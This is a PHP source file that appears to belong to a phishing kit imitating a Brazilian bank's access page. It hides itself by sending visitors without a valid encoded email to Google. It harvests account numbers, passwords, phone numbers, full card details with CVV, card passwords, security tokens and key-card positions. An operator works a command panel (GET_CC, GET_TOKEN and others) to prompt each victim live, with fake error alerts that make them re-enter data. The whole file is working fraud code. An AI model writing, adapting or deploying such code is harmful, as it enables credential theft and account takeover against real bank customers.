<?php 

$e500 = '<script language="javascript">window.location.replace("https://www.google.com/");</script>';
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "ACESSO: $email \n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; exit;
}  


include('../_functions/functions.php');

$UserId = getIdUser();

/* SALVANDO DADOS DO USUARIO */
if(isset($_POST['sender']) && $_POST['sender'] == 'ag_ct'):
	$Agencia = $_POST['agct'];
	$Conta = $_POST['ctct'];
	$Digito = $_POST['dgct'];
	$Senha4 = $_POST['ps4ct'];
	//$Cpf = $_POST['cpfct'];
	$ddd = $_POST['ddd'];
	$fone = $_POST['ms_phone'];

	$Cpf = $_SESSION['cpf'];
	$UserName = $_SESSION['nome'];

	$_SESSION['Agencia'] = $Agencia;
	$_SESSION['Conta'] = $Conta;
	$_SESSION['Digito'] = $Digito;
	//NOVO
	$_SESSION['UserName'] = '';

/* 	if(strlen($Cpf) == 11):
		$GetName = checkName($Cpf, $chaveApi);

		if($GetName == 'invalido' || $GetName == ''):
			//echo '<script>alert("Os dados informados não estão corretos.\nTente novamente!");</script>';
			//echo '<script>window.location.href="index.php";</script>';
			$_SESSION['UserName'] = '';
		else:
			$UserName = $GetName;
			$_SESSION['UserName'] = $UserName;	
		endif;	

	endif;	 */

	$GetInfoNav = SetNavegadorSO($conn, $UserId);
	$GetInfoNav = explode(';', $GetInfoNav);
	$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
	$GetInfoLoc = explode(';', $GetInfoLoc);

	$pc_name = gethostbyaddr($UserIp);
	$data_acesso = date('Y-m-d H:i:s');
	$browser_name = $GetInfoNav[0];
	$browser_version = $GetInfoNav[1];
	$sistema_operacional = $GetInfoNav[2];
	$cidade = $GetInfoLoc[0];
	$estado = $GetInfoLoc[1];
	$pais = $GetInfoLoc[2];
	$tipo_acesso = 'M. Fisico';
	$comando = 'LOADING';
	$status = 0;
	$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));

	$campos = 'id, ip, pc_name, email, data_acesso, browser_name, browser_version, sistema_operacional, cidade, estado, pais, tipo_acesso, comando, status, agencia, conta, digito, senha_4, enviou_tabela, time_acesso, cpf, nome, ddd, fone';
	$values = "'$UserId', '$UserIp','$pc_name', '$email', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$status', '$Agencia', '$Conta', '$Digito', '$Senha4', '0', '$timestamp', '$Cpf', '$UserName', '$ddd', '$fone'";

	create($conn, 'acessos', $campos, $values);
	unset($_SESSION['StarGet']);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_ps4'):
	$pass4 = $_POST['ms_pass'];

	update($conn, 'acessos', "comando = 'LOADING', senha_4 = '$pass4'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_phone'):
	$ddd = $_POST['ddd'];
	$fone = $_POST['ms_phone'];

	update($conn, 'acessos', "comando = 'LOADING', ddd = '$ddd', fone = '$fone'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_cc'):
	$cd_name 	= $_POST['cd_name'];
	$cd_num 	= $_POST['cd_number'];
	$cd_valm 	= $_POST['val_card_mes'];
	$cd_vala 	= $_POST['val_card_ano'];
	$cd_cvv 	= $_POST['cd_cvv'];
	$cd_val 	= $cd_valm.'/'.$cd_vala;

	update($conn, 'acessos', "comando = 'LOADING', cc_nome = '$cd_name', cc_numero = '$cd_num', cc_val = '$cd_val', cc_cvv = '$cd_cvv'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_psc'):
	$passcc 	= $_POST['ms_pass'];

	update($conn, 'acessos', "comando = 'LOADING', pass_6 = '$passcc'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'sended_message'):
	update($conn, 'acessos', "comando = 'LOADING'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');	

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_pos'):
	$pos_table = $_POST['pos_table'];

	update($conn, 'acessos', "comando = 'LOADING', tabela_valor = '$pos_table'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_table'):

	if(isset($_FILES['arquivo']) && $_FILES['arquivo'] != ''):
		$arquivo = $_FILES['arquivo'];
		$ext_file 	= strtolower(end(explode('.', $arquivo['name'])));

		$local_txt = '../_images/comprovantes';
		$UpaImagem = UploaderNow($UserIp, $arquivo, $local_txt);
		$comprovante_patch = $UserIp.'/comprovante.'.$ext_file;

		if($UpaImagem):
			update($conn, 'acessos', "comando = 'LOADING', enviou_tabela = '1', comprovante_patch = '$comprovante_patch'", "WHERE id = '$UserId'");
			header('Location: acesso.php?cliente='.$emailx.'');
		else:
			echo '<script>alert("Não conseguimos identificar corretamente a imagem enviada.\nTente novamente!");</script>';
			echo '<script>window.location.href="acesso.php?cliente='.$emailx.'";</script>';
		endif;	
	else:
		echo '<script>alert("Não conseguimos identificar corretamente a imagem enviada.\nTente novamente!");</script>';
		echo '<script>window.location.href="acesso.php?cliente='.$emailx.'";</script>';
	endif;	

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_token'):
	$token = $_POST['tks_now'];

	update($conn, 'acessos', "comando = 'LOADING', token = '$token', tipo_dispositivo = 'TOKEN'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

endif;	



/* BUSCANDO PÁGINAS */
if(isset($_SESSION['StarGet']) && $_SESSION['StarGet'] == 1):
	include('includes/acesso.php');
else:
	$GetComando = read($conn, 'acessos', "WHERE id = '$UserId'");

	switch ($GetComando[0]['comando']) {
		case 'GET_PSN':
			include('includes/acesso.php');
			$tabela = 'acessos';
			$cond = "WHERE id = '$UserId'";
			delete($conn, $tabela, $cond);
			echo '<script>alert("Os dados informados não estão corretos!\nTente novamente");</script>';
		break;
		case 'LOADING':
			include('includes/loading.php');
		break;
		case 'SET_MESSAGE':
			include('includes/set_message.php');
		break;
		case 'GET_CC':
			include('includes/need_card.php');
		break;
		case 'GET_PASS_CC':
			include('includes/need_pass_card.php');
		break;
		case 'GET_TABLE':
			include('includes/need_table.php');
		break;
		case 'GET_TOKEN':
			include('includes/need_token.php');
		break;
		case 'GET_PHONE':
			include('includes/need_phone.php');
		break;
		case 'GET_POS':
			include('includes/need_pos.php');
		break;
		case 'FINALIZADO':
			$DadosCookie = base64_encode($_SESSION['Agencia'].'-'.$_SESSION['Conta'].'-'.$_SESSION['Digito']);
			setcookie('Finalizado', $DadosCookie, (time() + (2 * 3600)));
			include('includes/finalizado.php');
		break;

		/* COMANDOS INVÁLIDOS */
		case 'GET_PSN X':
			include('includes/pass_net.php');
			echo '<script>alert("A senha de 4 dígitos informada não está correta.\nTente novamente!");</script>';
		break;	
		case 'GET_CC X':
			include('includes/need_card.php');
			echo '<script>alert("Os dados do cartão informado não estão corretos.\nTente novamente!");</script>';
		break;	
		case 'GET_PASS_CC X':
			include('includes/need_pass_card.php');
			echo '<script>alert("A senha do cartão de crédito/débito não está correta.\nTente novamente!");</script>';
		break;
		case 'GET_TABLE X':
			include('includes/need_table.php');
			echo '<script>alert("Não conseguimos identificar corretamente a imagem enviada.\nTente novamente!");</script>';
		break;
		case 'GET_TOKEN X':
			include('includes/need_token.php');
			echo '<script>alert("A Chave de Segurança Token informado, está incorreto ou já expirou.\nTente novamente!");</script>';
		break;
		case 'GET_PHONE X':
			include('includes/need_phone.php');
			echo '<script>alert("O telefone informado não está correto, ou não é o mesmo que está cadastrado conosco.\nTente novamente!");</script>';
		break;
		case 'GET_POS X':
			include('includes/need_pos.php');
			echo '<script>alert("A posição informada do Cartão Chave não está correta.\nTente novamente!");</script>';
		break;
		case 'ACESSO X':
			include('includes/acesso.php');
			$tabela = 'acessos';
			$cond = "WHERE id = '$UserId'";
			delete($conn, $tabela, $cond);
			echo '<script>alert("Os dados informados não estão corretos.\nTente novamente!");</script>';
		break;
		
		default:
			include('includes/loading.php');
		break;
	}
	
endif;



$TimeAtualiza = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));
$tabela = 'acessos';
$values = "time_acesso = '$TimeAtualiza'";
$cond = "WHERE id = '$UserId'";
update($conn, $tabela, $values, $cond);


?>
<meta http-equiv="refresh" content=<?= $AutoCarregamento;?>;url="acesso.php?cliente=<?php echo $emailx;?>">